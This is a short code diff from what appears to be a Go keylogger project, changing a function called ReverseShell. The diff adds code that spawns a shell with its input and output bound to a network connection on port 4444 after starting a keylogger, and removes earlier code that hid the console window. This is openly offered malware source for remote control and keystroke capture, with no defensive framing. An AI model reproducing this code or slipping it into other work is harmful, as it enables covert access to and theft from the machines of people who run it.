@@ -4,9 +4,9 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"os/exec"
 
 	"github.com/gabrielfnayres/keylogger_go/server"
-	"github.com/gonutz/w32/v2"
 )
 
 var connectionStr string = "localhost:4444"
@@ -34,18 +34,11 @@ func ReverseShell() {
 	if err != nil {
 		os.Exit(1)
 	}
-
-	defer conn.Close()
-	// This part is to open the "secret" window
 	server.ServerSideKeylogger()
-	cmd := w32.GetConsoleWindow()
-	if cmd == 0 {
-		return
-	}
-
-	_, consoleProcId := w32.GetWindowThreadProcessId(cmd)
-	if w32.GetCurrentProcessId() == consoleProcId {
-		w32.ShowWindowAsync(cmd, w32.SW_HIDE)
-	}
+	cmd := exec.Command("bin/sh")
+	cmd.Stdin = conn
+	cmd.Stdout = conn
+	cmd.Stderr = conn
+	cmd.Run()
 
 }
